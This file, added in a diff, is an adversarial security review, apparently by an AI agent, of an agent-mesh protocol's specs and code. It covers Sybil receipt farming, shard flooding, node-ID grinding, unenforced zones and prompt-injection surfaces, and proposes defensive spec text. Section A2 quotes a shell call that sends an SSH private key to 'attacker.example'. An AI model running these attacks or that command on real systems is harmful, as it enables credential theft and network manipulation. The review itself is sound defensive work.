@@ -1,0 +1,246 @@
+I'll start by reading the threat catalog in arch, then work outward through the other three drafts, verifying claims against the implementations as I go.
+
+Now the discovery draft — the DHT, descriptors, and NAT traversal are where §7's TH1/TH2/TH11 claims cash out.
+
+Let me verify the trust-path divergence empirically rather than by reading. Building first.
+
+I have enough verified material. Let me check for a publishable report type before writing this up.
+
+I have what I need. Writing up — everything below is verified against the drafts and both implementations, with measurements where I claim a cost.
+
+## Adversarial review — arch / discovery / trust / tasks
+
+**Verdict:** four BLOCKING issues. Three of the threat catalog's fifteen mitigations cite mechanisms that do not exist at the field level (TH7, TH15 → tool grants; TH1 → admission costs), and the one attack I could execute end-to-end against real code — receipt farming — lands in the subsystem `ops §6.3` itself lists as "not yet modeled."
+
+---
+
+### A1 — Receipt farming defeats the trust plane outright · BLOCKING
+
+**Steps.** Mint N throwaway Ed25519 keypairs. For each, build a `ReceiptCore` naming the Sybil as requester and yourself as provider, `outcome: 0`, and sign *both* roles — you hold both keys, so dual-signing is free. Serve them from `EVIDENCE_SET`.
+
+**Cost — measured** (`map-trust`, release build, one core):
+
+| Sybil receipts | score | confidence | CPU to mint |
+|---|---|---|---|
+| 1 honest receipt | 0.667 | 1.0 | — |
+| +10 | 0.875 | 6.0 | 1.7 ms |
+| +100 | 0.981 | 51.0 | 15.6 ms |
+| +1000 | **0.998** | **501.0** | **154 ms** |
+
+One genuine `outcome: 1` from a fully-trusted honest requester moves 0.9980 → 0.9960.
+
+**Spec's answer** — trust §9: "Self-praise via Sybil requesters | Issuer-trust weighting: receipts signed by unknowns carry ~0 weight (§7)".
+
+**It does not hold**, and §7 is why. §7's own recommended formula is `score = α/(α+β)` with prior `α₀ = β₀ = 1`, so a zero-evidence issuer scores **0.5, not ~0** — that is the weight I used above. §7 defines `w(r) = trust_in_issuer(r) × decay(…)` and never defines `trust_in_issuer` for an issuer you have no evidence about. §9 asserts one answer; §7 computes another.
+
+You cannot fix this by zeroing unknowns, because trust §6 forbids it: Tier 0 agents must be routable ("a mesh where nobody routes to the unproven never grows"). §6 and §9 make opposite demands of the same population, and the draft never reconciles them. Note also that `confidence` — the quantity §7 tells you to gate on ("Gate high-value routing on `confidence ≥ floor`, not score alone") — is *the cheapest thing in the system to manufacture*: it is a raw count.
+
+**Second defect, same area.** `TrustProjection::rebuild` weights each receipt by `trust_in_issuer(&v.core.requester)` — a field the *signer* chose — and does not gate on `dual`. A provider-only unilateral receipt naming a reputable agent as requester therefore inherits that agent's trust. I confirmed this against real code:
+
+```
+[1] forged unilateral VERIFIES. dual=false
+[2] store.ingest -> Ingested
+[3] rebuild() score for attacker = Some((0.667, 1.0))
+[4] dual-gated incremental score = None   <-- diverges from [3]
+```
+
+`map-taskrun`'s `apply_verified_evidence` ([evidence.rs:154](map-rs/crates/map-taskrun/src/evidence.rs:154)) *does* gate on `v.dual`; `rebuild` ([lib.rs:474](map-rs/crates/map-trust/src/lib.rs:474)) does not. The two paths produce different scores from the same store, breaking trust §7's own normative rebuild rule: "recomputing it from the receipt store MUST reproduce your scores." The spec is the root cause — it never says the weighting identity MUST be one that actually produced a signature present on the receipt.
+
+**Third, cross-implementation:** Rust `Receipt::verify()` accepts a single signature; Go `receipt.Verify()` requires both ([map-go/receipt/receipt.go:126](map-go/receipt/receipt.go:126)). Both are defensible under trust §3 ("at least one of 2,3 present") plus §2 (a unilateral receipt is "still valid evidence"). Two conformant implementations disagree on what "verified" means, and no NV vector covers it.
+
+**Does a receipt attest work was done?** No. It attests that two keys signed agreement about four integers. Nothing binds it to computation, to distinct economic entities, or to a model having run. That is defensible given arch §4.1's non-goal, but trust's abstract — "dual-signed ExecutionReceipts as immutable facts of past interactions" — oversells it. A dual signature is not evidence of an interaction when one party holds both keys.
+
+---
+
+### A2 — Tool authorization has no wire format · BLOCKING
+
+Tasks §7 is the cited mitigation for **both** TH7 (prompt injection) and TH15 (malicious tool execution). It consists of an ASCII diagram. There is no CDDL for `TOOL_CALL`/`TOOL_GRANT`/`TOOL_RESULT`, no field numbers, and — decisively — **no code points for the caveats that carry the authorization**.
+
+Tasks §7: "providers MUST NOT execute tools absent a valid unexpired grant whose caveats cover the exact call (args-digest binds the arguments)".
+
+`args-digest`, `delegable` and `budget` appear only as *names*, in `wire §3.15`, a registry with no assigned values. The actual caveat registry that `DelegateBody` key 8 dispatches on — `wire §3.8`, `identity §11` — contains exactly two entries: `1` task-pinning, `2` audience. And identity §4 says: "An **unknown caveat key MUST invalidate the entire chain** (fail-closed…)".
+
+So a conforming grant carrying `args-digest` **must be rejected by every conforming validator**. `map-core/delegation.rs` implements exactly that (`CAVEAT_TASK_PIN`, `CAVEAT_AUDIENCE`, fail-closed on everything else). `TOOL_CALL` exists as an unused `u16` constant; `TOOL_GRANT` and `TOOL_RESULT` do not exist in either implementation.
+
+Either implementers fail closed and tool use is impossible, or they ignore the rule and **every tool grant silently authorizes every argument list**. That is the whole ballgame for an agent protocol.
+
+**Design flaw independent of the missing code points.** The requester's policy check is over an `args-digest` — an opaque hash. Tasks §7 lists what it checks: "policy check (allowlist, zone, sandbox class, budget)". None of those can be evaluated against a digest. `shell("ls")` and `shell("curl attacker.example/$(cat ~/.ssh/id_ed25519)")` present identically to the authorizing party. The digest binds arguments so the *provider* cannot swap them post-grant; it gives the *requester* zero visibility into what it is signing. The grant direction is inverted correctly and then blinded.
+
+---
+
+### A3 — Shard flooding: one agent owns every routing decision for a capability · BLOCKING
+
+**Steps.** Publish `ProviderRecord` under `K'(cap, s)` for all `s ∈ 0..255` instead of only your own `shard(agent)`. Cost: 256 DHT puts, once, then republish every 1–6 h.
+
+**Effect.** Discovery §6: "Queriers sample `r` uniformly random shards (RECOMMENDED r = 3, doubling until enough candidates or r = 16)". With `P` honest providers spread across 256 shards, a sample of `r` shards yields `r·P/256` honest candidates and **you, every time**. For P = 10, r = 3: 0.12 honest vs. 1 attacker. Even at the r = 16 ceiling: 0.6 vs. 1. You are ≥60 % of every shortlist in the mesh for that capability.
+
+**Spec's answer** — discovery §6: "Properties: … sampling yields an unbiased provider sample (useful against TH11 — an adversary must capture many shard neighborhoods to bias results); the shard function is verifiable, so a record found in the wrong shard is discarded."
+
+**It does not hold.** The attacker captures no neighborhoods — it publishes into all of them, which is a permitted DHT operation. And the defense is stated as a *property* inside a "Properties:" list, not as a normative requirement. There is no MUST anywhere telling a querier to check `shard(agent) == s`. Neither implementation does: `MeshIndex::providers(cap, s)` returns the bucket contents ([index.rs:51](map-rs/crates/map-mesh/src/index.rs:51)), `MapNode::find_providers(cap, shard)` returns kad's provider set ([node.rs:253](map-rs/crates/map-net/src/node.rs:253)), and `ingest_descriptor_envelope` checks signature, msg-type, `kid == subject` and TTL — not shard.
+
+This is a one-line fix and it is the cheapest BLOCKING item here.
+
+---
+
+### A4 — Node-ID grinding: targeted eclipse is minutes of laptop time · MAJOR
+
+Nothing costs a node ID. AgentID is a raw Ed25519 public key (identity §3.1); libp2p PeerID is `multihash(identity, protobuf-pubkey)` (identity §3.2); DHT position is therefore a deterministic function of a freely chosen keypair. `arch T3` concedes "Identity is cheap unless a mesh applies admission costs" — and **admission costs (trust §5) are implemented nowhere**: zero hits for `JoinTicket`, `join_ticket`, PoW, stake, or vouch across both implementations.
+
+**Cost — measured** (`map-identity`, release, one core): **59,778 AgentIDs/sec**.
+
+| XOR prefix match | keygens | core-seconds |
+|---|---|---|
+| 16 bits | 6.6 × 10⁴ | 1.1 |
+| 20 bits | 1.0 × 10⁶ | 17.5 |
+| 24 bits | 1.7 × 10⁷ | 281 |
+
+In a mesh of N = 10⁶, the closest honest node to a given key sits at ~20 bits. Owning libp2p kad's full K = 20 replication set for one `K'(cap, s)` costs ≈ 20 × 17.5 s ≈ **6 core-minutes**, or under a minute on eight cores. At arch G10's stated target of 10⁹ identities it is ~30 bits → ~100 core-hours for a full replication set: single-digit dollars of spot compute.
+
+**Spec's answer** — discovery §8: "Queriers MUST use disjoint-path Kademlia lookups (≥3 disjoint paths) for identity and descriptor fetches; DHT routing tables SHOULD enforce IP-prefix diversity per bucket".
+
+**Unimplemented.** No disjoint-path logic exists in either implementation; `map-net` is stock `libp2p::kad` with default settings and no bucket-diversity policy. §8's honest half does hold — "an eclipse can *hide* providers (degrade) but cannot *forge* them," because descriptor integrity is end-to-end. But combined with A3, hiding is sufficient: suppress the honest set on a key, be the only survivor, and you have selected yourself.
+
+`tasks/README.md:120` lists "NAT/eclipse defenses" as frontier work "needs a new architect pass". `README.md`'s "Genuinely open work" section omits it entirely. Quantified: the gap is that a laptop positions itself on any target shard key in minutes, against a spec that assumes this is expensive.
+
+---
+
+### A5 — Capability lying is nearly free, and model substitution is undetectable · MAJOR
+
+**Cost of being wrong.** Advertise a capability you lack, accept, fail. Tasks §2: "accepting then violating them is receipt-recordable breach." The breach costs one negative receipt — *if* the requester bothers to issue one, and it is necessarily unilateral because trust §2 lets the provider "refuse to countersign." Per A1, one unilateral negative moves a farmed score by 0.002. And whitewashing is free: trust §9 counters it with "admission cost (§5) re-paid" — §5 is unimplemented, so the re-paid cost is zero. **A liar survives indefinitely.**
+
+**Model substitution is worse.** Tasks §2 marks constraint 7 "required model weights digest (**hard** if set)" and discovery §2 calls the weights multihash "the only verifiable model identity (TH6)." There is no mechanism by which a requester verifies which weights ran. The only audit offered is trust §8: "**Redundant execution**: dispatch the same task to k providers, compare transcript roots or graded outputs; disagreement lowers all, agreement raises all".
+
+**This is backwards for generative models.** There is no seed, temperature, or sampling-parameter field anywhere in `TaskConstraints` or `ModelEntry` — I checked the whole family. So k honest providers running the *identical* correct model produce different token streams and therefore different transcript roots, and the rule "disagreement lowers all" **penalizes them**. Meanwhile a colluding k-set trivially agrees. The audit mechanism is inverted: it punishes honesty and rewards collusion. Trust §10 acknowledges only the mirror-image failure ("correlated model failure masquerading as collusion"), not this one. "Graded outputs" is the escape hatch, and grading is entirely unspecified.
+
+---
+
+### A6 — Prompt injection is one table row · MAJOR
+
+`TH7 | Prompt injection via delegated content | Sandbox class advertisement; tool calls require requester-signed capability tokens with caveats; zone limits on raw data | tasks §7, arch §8`
+
+That row, plus one sentence in tasks §15, is the family's entire treatment. Of its three mitigations: tool grants do not exist (A2); zones are unenforceable (A7); sandbox class is a **self-declared descriptor field** (`SecurityProfile.1`) with, by trust §1's own P1 logic, exactly the epistemic status the draft condemns everywhere else.
+
+The gap is not merely thin text — it is structural. MAP moves model outputs and tool invocations between *mutually untrusting* agents with delegation chains, and every instruction-bearing surface is unguarded:
+
+- **Retrieved context** (tasks §12) enters a provider's context window as text from an arbitrary Zone-2 memory peer. §12's answer: "poisoned context is attributable (TH6/TH7)." Attributable is a post-mortem property, not a control.
+- **Delegation** (tasks §10) forwards a parent task's content to a subcontractor the root requester never chose.
+- **`TOOL_RESULT`** returns attacker-influenced bytes straight back into the model's context, and appears in the transcript as a kind-4 chunk — audited, never filtered.
+
+An agent-protocol RFC submitted in 2026 will be asked about exactly this, and the honest answer the drafts currently support is "nothing."
+
+---
+
+### A7 — Zones are unenforceable by construction · MAJOR
+
+Arch G6 promises "data-sensitivity zones enforced by **protocol rule, not convention**." Arch §8.1 marks §8.1 "(normative)".
+
+Rule Z2: "A provider MUST NOT forward received task content to a higher-numbered zone than it was received under (no laundering)".
+
+**Z2 is not a protocol rule.** It constrains what a provider does with bytes it already holds. Nothing observable on the wire distinguishes compliance from violation; the victim learns of the leak, if ever, out of band. It is precisely convention with a MUST attached.
+
+Implementation status: `zone` is a codec field in `TaskConstraints` and nothing else. `ZONE_VIOLATION = 2004` is referenced exactly once outside its definition — in a test asserting which error family it belongs to ([errors.rs:172](map-rs/crates/map-core/src/errors.rs:172)). No enforcement path exists in either implementation, and `CtxQuery`/`CtxResult` carry **no zone label at all**, so Z1 has no object to attach to on the retrieval path.
+
+**Concrete exfiltration.** A peer advertising `map:cap:memory/<domain>` serves `CtxResult = { 1 => [+ { 1 => bstr /*text*/ … } ] }` — **raw document text** — to any peer that supplies a matching embedding-model id. There is no zone field, no task binding, no delegation requirement, no `FLOW_CREDIT` (core §8.1 scopes credit to "task CHUNKs, evidence sets" only), and **no assigned message types** — `CtxQuery`/`CtxResult` appear in no code-point table in `core §5` or `wire §3`. Iterating query vectors enumerates the corpus. The same surface is A6's injection vector read in the other direction.
+
+`CtxQuery`/`CtxResult` having no message types is a fourth BLOCKING item on its own terms.
+
+---
+
+### A8 — Unauthenticated resource exhaustion · MAJOR
+
+**Core §8.3 is unimplemented in both implementations:** "Implementations MUST enforce configurable per-peer ceilings on: envelopes/s, HELLOs/min from an address, STATUS_QUERYs/min, and DHT-record ingestion/s". Zero hits. **Core §6.5's handshake cookie is unimplemented too** — and it is only a MAY ("Responders under load MAY reply to HELLO with ERROR 1005 carrying a `cookie`"), so the sole anti-spoof handshake defense is optional *and* absent.
+
+**Quadratic replay cache — measured.** Core §7.1 specifies a 10-minute MsgID cache and bounds it by deferral: "The cache bound is enforceable because of rate limits (§8.3)." With §8.3 absent there is no bound, and `ReplayCache::check` runs an unconditional full-map `retain()` sweep on *every* message ([replay.rs:66](map-rs/crates/map-core/src/replay.rs:66)):
+
+```
+n=  2000  total=     2.5ms  per-msg=  1.26us
+n=  8000  total=    39.2ms  per-msg=  4.90us
+n= 32000  total=   631.7ms  per-msg= 19.74us
+n= 64000  total=  2571.6ms  per-msg= 40.18us
+```
+
+32× the messages, ~1000× the work. Per-message cost grows linearly with cache occupancy; nothing expires inside the window. One peer saturates a core with in-window traffic, before any signature work.
+
+**Other unbounded surfaces:** `ingest_descriptor_envelope` enforces the "validity ≤ 24 h" ceiling **nowhere** — the check exists only on the *publish* path (`publish.rs:27`, "ttl out of range (0, 24h]"), which is exactly inverted: bounds belong on what you receive from adversaries, not on what you emit. A descriptor with `ttl_ms = 10 years` is accepted and cached indefinitely. Discovery §5's "MUST NOT exceed 32 capability keys" is enforced nowhere. `MeshIndex::ingest` stores capability entries and envelope bytes for *stale* descriptors too, with no eviction.
+
+**Chain-length contradiction.** Identity §4: "A chain MUST NOT exceed **8** certificates (a denial-of-service bound…)". Identity §10: "implementations MUST cap chain length (**default 5**)". Two normative numbers for one DoS bound; Rust picks 8. Pick one. (Ordering is fine: `open_delegated` verifies the leaf signature before walking the chain.)
+
+---
+
+## What the threat catalog misses
+
+Beyond the above, arch §7's fifteen rows have no entry for:
+
+1. **Content-derived instructions crossing a trust boundary** as a first-class threat. TH7 names prompt injection but scopes it to "delegated content"; retrieval, tool results, and model-to-model output are not covered.
+2. **Model extraction / distillation by a malicious requester.** Providers advertise `ModelEntry` with context size and weights digest; systematic querying clones a fine-tune. Every threat row treats the provider as attacker or the network as attacker; the requester-as-attacker case is represented only by TH15.
+3. **Memory-corpus enumeration** (A7). `map:cap:memory/*` is a bulk-exfiltration primitive with no listed threat.
+4. **Trust-bootstrap exploitation** — the §6/§9 contradiction in A1 is a threat, not just an inconsistency.
+5. **Honest-provider punishment via redundant-execution nondeterminism** (A5).
+
+One claim-vs-reality note in passing (Role 1's territory, flagged only because I touched it): `README.md` states "16/16 matrix" in three places (lines 16, 118, 173) while `memory.md:931` and TASK-029 record 26/26 (16 core + 6 task + 4 pay). Stale, in the conservative direction.
+
+---
+
+## Security Considerations text to add
+
+**trust-01 §10, new paragraph — issuer weighting (closes A1):**
+
+> An evaluator MUST derive a receipt's weight only from an identity that produced a signature present on that receipt. A receipt's `requester` or `provider` field is a claim by its signer and MUST NOT be used to select a weight on its own. Because dual-signing costs an attacker nothing when it controls both keys, `confidence` (§7) counts evidence, never independent attestation, and MUST NOT be used alone to gate high-value routing. Implementations SHOULD bound the total weight admitted from issuers about which the evaluator holds no independent evidence — for example, by capping the aggregate contribution of all zero-evidence issuers for a given subject at the weight of a single trusted issuer. Absent such a cap, an attacker purchases arbitrary `score` and `confidence` for the cost of one Ed25519 keypair and two signatures per receipt; a measured reference implementation reached score 0.998 at confidence 501 in 154 ms of single-core CPU. This tension with the graduated bootstrap of §6 is real and unresolved: §6 requires that zero-evidence agents remain routable, and any rule that zeroes unknown *issuers* must not also zero unknown *subjects*.
+
+**trust-01 §10, new paragraph — what a receipt attests:**
+
+> A dual-signed ExecutionReceipt attests that two keys asserted agreement about the fields of a `ReceiptCore`. It does not attest that computation occurred, that a particular model executed, or that the signing parties are distinct economic entities. Consumers MUST NOT treat receipt density as evidence of work performed.
+
+**discovery-01 §11, new paragraph — shard integrity (closes A3):**
+
+> A querier MUST discard any provider record retrieved from `K'(cap, s)` whose subject does not satisfy `shard(subject) == s`, and MUST apply this check before the record influences candidate selection. Without it, an agent publishing to all 256 shards appears in every sample while honest providers appear in `r/256` of them, so a single agent dominates every shortlist for a capability at a one-time cost of 256 DHT puts. The check is one hash per record and requires no additional round trip.
+
+**discovery-01 §11, new paragraph — node-ID placement (closes A4):**
+
+> MAP node identifiers are unkeyed Ed25519 public keys and their DHT positions are therefore freely chosen. On commodity hardware an attacker derives ≈6 × 10⁴ candidate identifiers per second per core, so positioning a full replication set adjacent to any chosen key costs minutes of single-machine compute in a 10⁶-node mesh and hours in a 10⁹-node mesh. The disjoint-path and bucket-diversity requirements of §8 are the only structural defense and MUST be implemented; deployments that omit them offer no eclipse resistance whatsoever. Where a mesh depends on discovery availability rather than merely discovery integrity, it MUST apply an admission cost (trust §5) that binds identifier creation to a non-trivial cost, and MUST state the chosen cost in mesh policy.
+
+**tasks-01 §15, new subsection — content-derived instructions:**
+
+> Task payloads, retrieved context (§12), and tool results (§7) carry content that may have been authored by a party other than the requester, and that content is interpreted by a model whose subsequent tool invocations are indistinguishable at the protocol layer from invocations the requester intended. MAP provides attribution for this content, not containment: `ContextRef` provenance and kind-4 transcript chunks identify the source of injected instructions after the fact and do not prevent their execution.
+>
+> Consequently: a provider MUST treat all task input, all retrieved context, and all tool output as untrusted data and MUST NOT allow it to widen a tool grant's caveats. A requester issuing a `TOOL_GRANT` authorizes a tool URI, not an intent; because the grant binds an opaque `args-digest`, the requester cannot inspect what the tool is being asked to do, and a grant for a tool with side effects is therefore a grant to perform arbitrary side effects of that tool's class. Requesters SHOULD restrict grants to tools whose entire argument space is acceptable, or require the provider to disclose arguments in cleartext alongside the digest before granting. Delegation (§10) compounds this: the root requester authorizes a chain, not each subcontractor's inputs.
+>
+> The `SecurityProfile` sandbox class (discovery §2) is self-asserted and carries the same epistemic weight as any other self-issued claim (trust §1, P1); it MUST NOT be relied on as an enforcement boundary absent attestation.
+
+**tasks-01 §15, new paragraph — memory retrieval as an exfiltration surface:**
+
+> `CtxQuery`/`CtxResult` (§12) return retrieved text to any peer presenting a matching embedding-model identifier, and carry no zone label, no task binding, and no flow control. A responder MUST apply the zone rules of §9 to every `CtxResult` it emits, treating the retrieved text's zone as that of the underlying corpus and refusing the query where the requesting peer's zone level exceeds it. Responders MUST rate-limit `CtxQuery` per peer: an adversary iterating query vectors enumerates the corpus, and query embeddings are themselves sensitive — they are partially invertible to source text and MUST be treated as Zone-labelled payload, not as routing metadata.
+
+**trust-01 §10, new paragraph — redundant execution (closes A5):**
+
+> Transcript-root comparison across a redundant set (§8) is sound only for deterministic execution. MAP specifies no sampling seed or temperature, so independent providers running identical correct models produce differing transcripts; a rule of "disagreement lowers all" therefore penalizes honest providers and rewards collusion, which agrees trivially. Implementations MUST NOT apply transcript-root comparison to nondeterministic generation and SHOULD restrict it to capabilities whose outputs are reproducible. For generative capabilities, only graded-output comparison is meaningful, and grading is out of scope for this document.
+
+**arch-01 §7, threat catalog additions:**
+
+> | TH16 | Content-derived instruction execution across a trust boundary (injection via input, retrieved context, tool output, or delegation) | Untrusted-data discipline; argument disclosure alongside `args-digest`; zone rules on retrieval; sandboxing as a floor, not a boundary | tasks §7, §12, §15 |
+> | TH17 | Model extraction / corpus enumeration by a malicious requester | Per-peer query rate limits; zone gating on retrieval; provider-side quotas | tasks §12, discovery §11 |
+> | TH18 | Trust bootstrap exploitation (manufacturing confidence from zero-evidence issuers) | Weight only identities that signed; cap aggregate zero-evidence weight per subject | trust §6, §7, §10 |
+
+**core-01 §8.3, tighten:**
+
+> The ceilings of §8.3 are load-bearing for the §7.1 replay cache, which has no independent bound: a peer that can emit messages faster than the window expires them grows the cache without limit, and an implementation whose cache expiry is a linear scan does work quadratic in the messages received. Implementations MUST additionally impose a hard entry cap on the replay cache and MUST evict by arrival order once it is reached, so the cache remains bounded when rate limiting is misconfigured or absent.
+
+**discovery-01 §9, correct the overstatement:**
+
+> §9(a) currently reads "shard sampling already hides *which* providers you saw". It hides the sample from providers not contacted; it does not hide it from the shard-key holders, who observe every `GET_PROVIDERS` for their key and thereby learn which requester sought which capability and when. §9's relay option (b) applies to `CAP_QUERY` only and has no analogue on the DHT plane of §5/§6, which is the primary discovery path. Arch §8.3 states this correctly ("DHT queries reveal interest in a capability to the queried nodes"); §9(a) should be reworded to match it.
+
+**arch-01 §8.3, add — the correlator (direction 6):**
+
+> AgentID is a long-term public key that simultaneously fixes the agent's DHT position (`shard(agent)`, discovery §6), its transport identity (identity §3.2), and its channel-binding input (core §7.3). It is a permanent correlator across every interaction an agent has. Zones do not mitigate this: zones constrain where *payloads* may flow, not which identity is presented, and an agent using one AgentID across Zone-1 and Zone-3 relationships is linkable across both. Ephemeral identities (identity §6) break the correlation only at the cost of the agent's entire evidence history, because non-transferability of reputation is the same property that provides Sybil containment (trust §5.4). For providers, whose economic position *is* their receipt corpus, rotation is therefore not a usable privacy option, and providers should be assumed permanently correlatable by any party observing the DHT. MAP offers no mechanism — blinded credentials, pseudonym-set receipt aggregation — that would provide both properties; this is a known limitation, not an oversight.
+
+---
+
+## What I did not examine
+
+- `draft-map-pay-01` and the dispute protocol — a large attack surface (escrow authorization, watermark arithmetic, x402 rail) left entirely to another role. My A1 finding likely has a payment analogue via `ReceiptCore.10` payment-reference linkage; I did not chase it.
+- `draft-map-core-01` §§1–5 and §§10–14: envelope/CBOR determinism, transport bindings, timestamp handling. I read §6–§9 only.
+- `draft-map-ops-01` beyond the G-1…G-7 gateway rules and §6.3.
+- `draft-map-index/intro/wire` except the registry tables I cite.
+- I did not run the ProVerif models (WSL2), the interop matrix, or the Go test suite; I read the Go receipt path only. The Rust workspace builds — I compiled `map-trust`, `map-core`, `map-identity`, `map-tasks` and linked against them from a scratch crate outside the repo. **I made no changes to the repository.**
+- I did not attempt a live network attack against a running mesh; all costs above are either measured on the real code paths in isolation or derived from measured primitive rates with the assumptions stated inline.
+- Formal coverage: `formal/` models hello/CB, delegation, and payment. Nothing models discovery, trust, or zones — which is where A1, A3, A4 and A7 live. `ops §6.3` already states this ("Remaining future formal work (not yet modeled): receipts non-repudiation…"); I am agreeing with it, not discovering it.
